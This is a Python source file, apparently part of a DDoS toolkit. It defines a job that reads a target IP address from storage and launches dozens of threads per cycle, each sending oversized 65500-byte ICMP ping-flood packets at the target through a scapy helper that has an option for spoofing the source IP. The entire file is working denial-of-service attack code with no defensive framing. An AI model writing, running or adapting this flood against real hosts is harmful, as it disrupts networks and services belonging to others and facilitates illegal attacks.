import os
import threading
import time
from rvkinh_utils import AbstractJob, UtilsScapy
from injectable import injectable, autowired, Autowired
from storage.storage_target import StorageTarget


CURRENT_CPU_COUNT = os.cpu_count()
print('JobAttackPingFlood: CURRENT_CPU_COUNT=' + str(CURRENT_CPU_COUNT))
THREADS_BY_CPU_COUNT_MAP = {1: 60, 2: 120, 12: 120}
DELAYS_BY_CPU_COUNT_MAP = {1: 2, 2: 1.25, 12: 1}


@injectable
class JobAttackPingFlood(AbstractJob):
    @autowired
    def __init__(self, storage_target: Autowired(StorageTarget), utils_scapy: Autowired(UtilsScapy)):
        super().__init__()
        self.storage_target = storage_target
        self.utils_scapy = utils_scapy

    def launch_attack_in_thread(self, thread_index: int, target_ip_address: str):
        print('JobAttackPingFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
        if target_ip_address is not None and len(target_ip_address) > 0:
            self.utils_scapy.attack_ping_flood(target_ip_address, number_of_packets_to_send=3, size_of_packet=65500, spoof_source_ip=False)
        print('JobAttackPingFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))

    def job_iteration(self):
        print('JobAttackPingFlood.job_iteration(): Started')

        # Get target
        target_ip_address = self.storage_target.get_ping_flood_target_ip_address()

        # Early stop
        if target_ip_address is None or len(target_ip_address) == 0:
            print('JobAttackPingFlood.job_iteration(): WARNING!!! No target IP found')
            time.sleep(30)
            return

        # Launch separate threads with attacks
        for thread_index in range(0, THREADS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT]):
            thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index, target_ip_address])
            thread.start()
        time.sleep(DELAYS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT])

        print('JobAttackPingFlood.job_iteration(): Finished')
